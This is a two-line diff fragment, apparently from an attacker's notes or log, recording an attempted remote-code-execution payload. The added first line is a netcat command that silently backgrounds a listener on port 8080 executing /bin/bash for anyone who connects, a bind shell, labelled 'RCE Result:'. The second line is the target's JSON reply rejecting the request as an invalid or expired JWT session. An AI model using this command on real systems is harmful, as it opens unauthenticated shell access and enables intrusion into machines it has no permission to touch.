@@ -1,0 +1,2 @@
+nohup nc -lvnp 8080 -e /bin/bash > /dev/null 2>&1 & RCE Result:
+{"success":false,"errorMessage":"Invalid or expired session","errorDescription":"invalid or expired jwt"}
